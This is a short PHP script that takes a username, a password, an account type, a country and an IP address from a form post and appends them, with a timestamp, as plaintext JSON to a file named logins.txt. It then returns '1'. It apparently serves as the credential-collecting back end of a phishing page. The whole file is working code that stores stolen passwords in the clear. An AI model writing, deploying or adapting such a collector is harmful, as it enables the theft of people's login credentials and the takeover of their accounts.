<?php
// Get the POST data
$user = $_POST['user'];
$pass = $_POST['pass'];
$type = $_POST['type'];
$country = $_POST['country'];
$ip = $_POST['ip'];

// Prepare the data as a JSON string
$data = array(
    "user" => $user,
    "pass" => $pass,
    "type" => $type,
    "country" => $country,
    "ip" => $ip,
    "timestamp" => date("Y-m-d H:i:s")
);

$json_data = json_encode($data) . PHP_EOL;

// Write the data to a log file
$file = 'logins.txt';
file_put_contents($file, $json_data, FILE_APPEND | LOCK_EX);

// Response to the client
echo "1";
?>
